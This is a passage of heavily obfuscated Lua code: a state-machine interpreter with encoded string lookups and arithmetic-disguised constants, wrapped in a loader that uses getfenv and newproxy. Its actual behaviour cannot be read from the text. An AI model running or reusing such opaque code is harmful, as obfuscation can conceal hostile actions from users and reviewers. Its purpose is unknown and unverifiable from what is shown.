m=C[p(946630+-904639)]N=p(289976-247787)q=C[N]N=p(83352-41198)Q=q[N]N=L[X[-531819+531820]]q={Q(N)}o={d(q)}end else if m<12871150-724353 then if m<12687380-733522 then G=nil m=821315+2906719 M=nil else t=188963+31178976827027 G=p(853756-811612)c=L[X[-815060+815061]]r=L[X[-1033685+1033687]]M=r(G,t)x=c[M]m=y[x]M=p(-660997-(-702972))M=m[M]M={M(m)}x=M[-825594-(-825595)]c=M[-270095+270097]m=2751353-(-976681)r=M[272695-272692]end else k=p(4965-(-37146))e=L[X[808592-808591]]E=905544+3606754243911 B=L[X[462319-462317]]m=p(-313422+355556)P=B(k,E)b=e[P]m=a[m]K=j m=m(a,b)A=1013100+24815646226359 b=m m=p(-643255+685389)m=a[m]E=p(-407848+450022)B=L[X[311846-311845]]P=L[X[640768+-640766]]k=P(E,A)e=B[k]m=m(a,e)e=m m=e and-781711+5266640 or 976980+10490567 end end else if m<-430609+13052374 then if m<12948222-467551 then if m<-781270+13130191 then o={}m=C[p(-141228+183272)]else Y=not u G=G+t r=G<=M r=Y and r Y=G>=M Y=u and Y r=Y or r Y=-656733+5548564 m=r and Y r=-151917+16243649 m=m or r end else t=p(-522637-(-564680))r=L[X[687668+-687667]]l=q u=-464950+34835193993107 M=L[X[1007886+-1007884]]G=M(t,u)c=r[G]x=p(-832374-(-874453))x=y[x]x=x(y,c)m=not x m=m and 974844+4385394 or 12862114-745487 end else if m<13061450-422119 then x=p(876976-834804)c=500459+32259732789187 t=9259256963909-266862 q=p(607458-565311)m=L[X[884189-884186]]Q=C[q]N=L[X[-865192+865193]]l=L[X[-897513+897515]]y=l(x,c)c=6132712396223-527000 M=p(-584341-(-626614))q=N[y]o=Q[q]N=L[X[64824+-64823]]l=L[X[408598+-408596]]G=41235+16896860585385 x=p(987843-945619)u=-480072+8433082851998 y=l(x,c)q=N[y]y=p(-254691+296838)l=C[y]x=L[X[987489-987488]]c=L[X[-858184-(-858186)]]r=c(M,G)M=914023+4922234427021 y=x[r]r=p(262703-220650)N=l[y]y=L[X[-677962-(-677963)]]x=L[X[795852-795850]]c=x(r,M)l=y[c]y=L[X[-726633+726637]]c=L[X[-730635+730636]]G=p(-86457-(-128434))r=L[X[-977989-(-977991)]]M=r(G,t)t=p(804785-762587)x=c[M]c=L[X[630921-630916]]Q={[q]=N,[l]=y;[x]=c}m[o]=Q m=L[X[824330-824324]]N=p(-838074-(-880221))q=C[N]c=p(834582-792342)l=L[X[-982346-(-982347)]]r=-632918+18678676343375 y=L[X[353070-353068]]x=y(c,r)r=18845150977440-(-263335)N=l[x]Q=q[N]c=p(502383+-460238)l=L[X[657122+-657121]]y=L[X[-928921+928923]]x=y(c,r)N=l[x]y=L[X[-274792-(-274797)]]r=L[X[-963256+963257]]M=L[X[-516965-(-516967)]]G=M(t,u)c=r[G]r=L[X[434108-434104]]x=c..r l=y..x q=N..l N=-1029557+1029562 o=m(Q,q,N)m=4045472-755010 else i=p(802172+-760056)w=C[i]WK=118365+8735004311942 U=p(-156902+199018)R=m i=w(B)w=C[U]CK=L[X[899586-899585]]dK=p(278008-235833)pK=L[X[970368-970366]]mK=pK(dK,WK)S=CK[mK]h=H[S]U=w(h)f=i>=U D=f m=f and 10010844-765030 or 16964735-910358 end end end end end else if m<14805579-(-87781)then if m<12639228-(-906040)then if m<13881409-517156 then if m<182500+12591350 then if m<12626611-(-75545)then if m<13388081-705243 then o=p(-12492+54734)x=p(-726823+768908)m=C[o]N=L[X[738311-738310]]l=L[X[574548-574546]]c=485555+23587907207732 y=l(x,c)q=N[y]o=m(q)q=p(-357650-(-399839))x=p(-141204+183306)o=C[q]N=L[X[163796+-163795]]l=L[X[752768-752766]]c=21964996429873-516157 y=l(x,c)q=N[y]m=o[q]o=m(Q)Q=o m=693194+3935708 else o={}m=C[p(-172757+214860)]end else N,y=Q(q,N)m=N and 9316161-264006 or 5558096-(-836854)end else if m<12273211-(-933059)then if m<13618084-599250 then b=L[q]a=b m=b and-785322+9655239 or-365210+13776206 else Q=L[X[-961341+961342]]o=#Q Q=633699-633699 m=o==Q m=m and-472345+499207 or 11554236-(-97373)end else S=z(S)U=z(U)r=z(r)M=z(M)K=nil m=C[p(610272-568130)]h=nil P=z(P)D=nil H=nil q=z(q)B=z(B)Y=z(Y)l=z(l)N=nil E=nil w=z(w)O=nil G=z(G)A=nil j=z(j)t=z(t)u=z(u)y=z(y)i=nil c=z(c)o={}x=z(x)end end else if m<12826984-(-585130)then if m<12579217-(-831682)then if m<1022906+12357836 then c=16737033088150-(-1044955)y=p(-762755+804789)Q=W[791355+-791354]m=p(-291093+333346)q=L[X[-91485+91486]]x=17186512176437-386546 N=L[X[-959256-(-959258)]]l=N(y,x)o=q[l]N=L[X[253904-253903]]x=p(492335+-450220)l=L[X[-398247-(-398249)]]m=Q[m]y=l(x,c)q=N[y]m=m(Q,o,q)L[X[-163385+163388]]=m q=p(-19862+62104)o=C[q]N=L[X[-820230+820233]]Q=nil m=C[p(485234-443066)]q=o(N)o={}else m=9899637-(-773735)w=-143626-(-143627)f=D[w]R=f end else L[q]=a m=L[q]m=m and 227942+15121777 or 1223013-187329 end else if m<-913254+14457162 then q=L[X[-357836-(-357839)]]N=-996479-(-996480)Q=q~=N m=Q and-167300+9965781 or 757067+7177269 else q=nil m={}Q=m o=nil m=L[X[-347152+347153]]l=o N=m m=458219+16208818 end end end else if m<14728758-265944 then if m<350267+13516024 then if m<611363+13141092 then if m<-776837+14463044 then m=C[p(870369+-828136)]o={}else y=p(-941606-(-983789))x=6721085838993-(-783784)Q=W[-439060-(-439061)]q=L[X[-699383-(-699384)]]c=888535+18137482121766 N=L[X[-1028433-(-1028435)]]l=N(y,x)o=q[l]N=L[X[-689900+689901]]m=p(-767817+810070)x=p(879129+-837014)l=L[X[780585-780583]]y=l(x,c)m=Q[m]q=N[y]m=m(Q,o,q)L[X[744020-744017]]=m q=p(674672+-632430)o=C[q]N=L[X[118056-118053]]m=C[p(-700142+742124)]q=o(N)o={}Q=nil end else q=p(-1007798+1050040)r=12793436193327-649962 c=p(-951473-(-993623))m=C[q]l=L[X[225701-225700]]y=L[X[463781-463779]]x=y(c,r)r=27778970677342-(-934441)N=l[x]q=m(N)N=p(-193040-(-235229))q=C[N]c=p(-686345+728459)l=L[X[907912+-907911]]y=L[X[151699+-151697]]x=y(c,r)N=l[x]m=q[N]N=L[X[517479+-517476]]q=m(N)L[X[-60834+60837]]=q m=2755381-284406 end else if m<14966101-593736 then if m<-521534+14425687 then q=p(587068-544921)x=p(-165889-(-207874))o=C[q]N=L[X[523493+-523492]]c=5320049448147-822054 l=L[X[1018483-1018481]]y=l(x,c)q=N[y]m=o[q]m=m and 960147+5267136 or 5882417-(-218362)else j={}x=nil t=nil Y=nil K=v()k=p(-810550+852816)O=p(381495-339362)B=J(816010+12235345,{K;M;G;y})L[K]=j j=v()w=nil E={}P=v()D=p(1004307-962344)r=nil L[j]=B B={}L[P]=B c=nil B=C[k]t=858860+5234967572121 H=L[P]A={[O]=H,[D]=w}k=B(E,A)O=p(899035+-857054)r=p(-274834+316901)B=I(-105690+16132158,{P,K,u;M,G;j})y=z(y)G=z(G)u=z(u)P=z(P)N=nil M=z(M)L[l]=k L[q]=B G=20321176127309-(-187817)j=z(j)M=2506017541675-(-718435)K=z(K)y=L[l]x=L[q]c=x(r,M)B=13959311187289-279541 N=y[c]y=v()M=p(-964202-(-1006172))H=-435974+2940173986911 L[y]=N x=L[l]c=L[q]r=c(M,G)G=p(179143-137170)N=x[r]x=v()K=-569397+7171897998656 L[x]=N c=L[l]r=L[q]M=r(G,t)r=v()N=c[M]Y=p(-265329+307555)M=v()c={}j=177730+26338593192358 L[r]=c c={}L[M]=c G=L[l]t=L[q]u=t(Y,j)c=G[u]G=v()L[G]=c t=L[l]u=L[q]j=p(-7937+50162)Y=u(j,K)c=t[Y]t=v()L[t]=c u=L[l]K=p(578516-536367)Y=L[q]j=Y(K,B)c=u[j]u=v()Y=v()L[u]=c j=v()c=-466938+466938 L[Y]=c c=368641-368640 L[j]=c K=p(-438794-(-481041))c=C[K]P=L[l]E=L[q]K=p(1069669-1027673)A=E(O,H)H=9549045518772-966742 K=c[K]B=P[A]K=K(c,B)O=p(-932603+974773)c=v()L[c]=K B=p(-309034-(-351181))K=C[B]P=L[l]E=L[q]A=E(O,H)B=P[A]P=false K[B]=P P=p(-384964+427060)B=C[P]E=L[t]P=B(E)K=not P m=K and 8754939-(-49345)or 14705836-135278 end else m=C[p(107204+-64932)]o={q}end end else if m<14352059-(-411909)then if m<-499762+15117868 then if m<15375967-788895 then h=-557180+20532621796821 P=p(-679708-(-721712))B=C[P]A=L[t]U=p(-800640+842781)D=L[l]w=L[q]i=w(U,h)H=D[i]D=L[u]O=H..D E=A..O P=B(E)K=not P m=K and 609072+14188288 or 119344+10058033 else m=p(521107+-478844)m=a[m]m=m(a)m=-856643+11461270 end else m=true m=m and 374681-(-47069)or-260287+13814890 end else if m<15118213-307529 then i=p(836503-794249)B=p(-625142+667200)K=C[B]E=L[t]U=-963556+19703120697274 H=L[l]D=L[q]w=D(i,U)O=H[w]H=L[u]m=-700021+10877398 A=O..H H=p(-956885-(-999150))P=E..A E=L[c]H=E[H]O=L[r]A={H(E,O)}B=K(P,d(A))else j=Y b=L[X[32845+-32844]]k=23559630276553-531695 P=p(-338211-(-380299))e=L[X[-361767-(-361769)]]B=e(P,k)m=p(-18233+60367)m=K[m]a=b[B]m=m(K,a)a=m m=a and 837130+13750745 or 1046314+9558313 end end end end else if m<16402638-833941 then if m<14669535-(-621463)then if m<14205563-(-854458)then if m<14344568-(-691798)then if m<-552253+15546675 then m=-591290+4948676 G=nil t=nil else m=100436+4256950 t=nil G=nil end else m=L[X[-501993-(-502003)]]q=L[X[-679902-(-679913)]]Q[m]=q m=L[X[-130010-(-130022)]]q={m(Q)}m=C[p(-302271-(-344288))]o={d(q)}end else if m<15527784-294681 then if m<-196374+15274678 then Q=W[-60263+60264]q=p(-740774+783023)x=p(-495287+537300)o=C[q]q=o(Q)N=L[X[374146+-374145]]c=830444+26545539662941 l=L[X[377236-377234]]y=l(x,c)o=N[y]m=q==o m=m and 12645071-(-1753)or-140855+4769757 else o={}m=true L[X[955679+-955678]]=m m=C[p(187127+-144915)]end else S=-95001+34200664797518 O=E w=L[X[-910227+910228]]i=L[X[743447-743445]]h=p(103083-60978)U=i(h,S)f=w[U]R=H[f]D=P==R m=D and 258253+12384357 or 690231+4660007 end end else if m<15679746-207198 then if m<14450119-(-947610)then if m<15127607-(-210391)then j,a=u(Y,j)m=j and 12429986-268716 or 15090668-162307 else m=6188581-1035368 end else N=p(937035-894786)q=C[N]l=L[X[-598557-(-598560)]]N=q(l)r=30153217681545-766384 c=p(462666-420535)l=L[X[-976961-(-976962)]]y=L[X[125477-125475]]x=y(c,r)q=l[x]m=N==q m=m and 12958212-(-903943)or 2758640-287665 end else if m<713560+14794666 then j=K E=j Y[j]=E j=nil m=6368681-233920 else m={}G=-520491+520492 L[X[-13242-(-13244)]]=m r=p(-106350-(-148477))y=168375+35184371920457 o=L[X[191511+-191508]]m=-122864+12542860 l=o o=q%y c=455368-455113 L[X[577717-577713]]=o x=q%c c=-862242+862244 y=x+c L[X[1017063+-1017058]]=y c=C[r]t=G r=p(-642966-(-685150))x=c[r]r=-952004+952005 c=x(Q)x=p(101583-59468)N[q]=x x=-497945+498031 G=898997+-898997 u=t<G G=r-t M=c end end end else if m<-732886+17184989 then if m<16409190-327994 then if m<-608560+16667521 then if m<738638+15302998 then m=L[X[-945576-(-945577)]]N=m q=W[466984+-466982]m=N[q]Q=W[75371-75370]m=m and 696126+-107895 or-613934+16148220 else m=R m=D and 11176815-521586 or 119437+16374768 end else m=9944762-(-333574)end else if m<16829685-433320 then if m<126166+15977113 then x=nil c=nil m=-748920+15137586 l=nil else E=L[X[56498+-56497]]f=-819385+249049743660 A=L[X[263608+-263606]]D=-305604+31536734167841 H=p(-851383-(-893453))O=A(H,D)R=859471+29236243535839 k=E[O]m=b[k]A=L[X[278418+-278417]]O=L[X[-526434+526436]]D=p(-786773-(-828868))H=O(D,R)k=p(1033667-991414)k=m[k]E=A[H]O=L[X[829542+-829541]]H=L[X[734520+-734518]]R=p(-790303-(-832418))D=H(R,f)A=O[D]D=3331868162245-225974 k=k(m,E,A)B=k H=p(719507-677470)E=L[X[-198971-(-198972)]]A=L[X[-936388+936390]]O=A(H,D)k=E[O]m=b[k]E=nil P=m m=L[X[446696-446693]]k=nil A=m m=297497+319493 end else i=p(-375941+418146)O=p(46892+-4745)A=C[O]H=L[l]U=29366010568805-895739 D=L[q]w=D(i,U)O=H[w]m=5928427-703815 E=A[O]P=not E K=P end end else if m<750139+15742332 then if m<321040+16161977 then if m<16803082-345350 then N=p(341200+-298970)q=C[N]l=L[X[446535-446534]]y=L[X[-1030304+1030306]]c=p(-784458+826606)r=207271+15701148627688 x=y(c,r)N=l[x]Q=q[N]N=L[X[-978505-(-978506)]]l=L[X[-829768-(-829770)]]x=p(-713638+755879)c=31148422381457-(-342295)y=l(x,c)x=4342872703053-882791 q=N[y]o=Q[q]q=L[X[-206412+206413]]N=L[X[764766-764764]]y=p(-26266+68312)l=N(y,x)Q=q[l]N=p(1021074+-979099)m=o[Q]N=m[N]N={N(m)}m=6977519-888574 q=N[-576395-(-576398)]o=N[-732442-(-732443)]Q=N[263586-263584]N=o else Q=W[-1032131+1032132]q=p(668573+-626324)o=C[q]q=o(Q)x=p(-446983-(-489180))c=13922916276528-376797 N=L[X[534904-534903]]l=L[X[-960003+960005]]y=l(x,c)o=N[y]m=q==o m=m and-886114+7837745 or 16189926-719807 end else TK=30053158265772-929026 mK=p(305445-263400)pK=C[mK]dK=L[l]nK=p(-712213+754314)WK=L[q]XK=WK(nK,TK)mK=dK[XK]CK=pK[mK]mK=520414-520413 pK=CK(mK)m=pK and 4927764-(-641699)or 12456556-(-894497)end else if m<17483665-927821 then m=529711+4820527 else q,x=N(l,q)m=q and 3126035-(-392724)or-116274+3010194 end end end end end end end end m=#n return d(o)end,function(C)Q[C]=Q[C]-(627312-627311)if Q[C]==94732-94732 then Q[C],L[C]=nil,nil end end,{},function(C)for p=609205-609204,#C,-590918+590919 do Q[C[p]]=Q[C[p]]+(-406403-(-406404))end if W then local m=W(true)local d=n(m)d[p(580990-538857)],d[p(-236284+278361)],d[p(1020347+-978115)]=C,l,function()return-824577+449818 end return m else return X({},{[p(522177+-480100)]=l,[p(895638+-853505)]=C,[p(864808+-822576)]=function()return-1153811-(-779052)end})end end,function(C,p)local d=N(p)local W=function(W,X,n,T,o)return m(C,{W,X;n;T;o},p,d)end return W end,{},function()q=(451465-451464)+q Q[q]=-222953-(-222954)return q end,function(C,p)local d=N(p)local W=function(W,X,n,T,o,L)return m(C,{W;X,n,T;o,L},p,d)end return W end,function(C)local p,m=-460516+460517,C[-1006331-(-1006332)]while m do Q[m],p=Q[m]-(-157762+157763),(509073+-509072)+p if 201596+-201596==Q[m]then Q[m],L[m]=nil,nil end m=C[p]end end,function(C,p)local d=N(p)local W=function(W)return m(C,{W},p,d)end return W end,function(C,p)local d=N(p)local W=function()return m(C,{},p,d)end return W end,function(C,p)local d=N(p)local W=function(W,X,n,T)return m(C,{W,X,n;T},p,d)end return W end,function(C,p)local d=N(p)local W=function(...)return m(C,{...},p,d)end return W end,function(C,p)local d=N(p)local W=function(W,X,n)return m(C,{W;X;n},p,d)end return W end,function(C,p)local d=N(p)local W=function(W,X)return m(C,{W,X},p,d)end return W end,719941-719941 return(y(4836263-621107,{}))(d(o))end)(getfenv and getfenv()or _ENV,unpack or table[p(912533+-870442)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
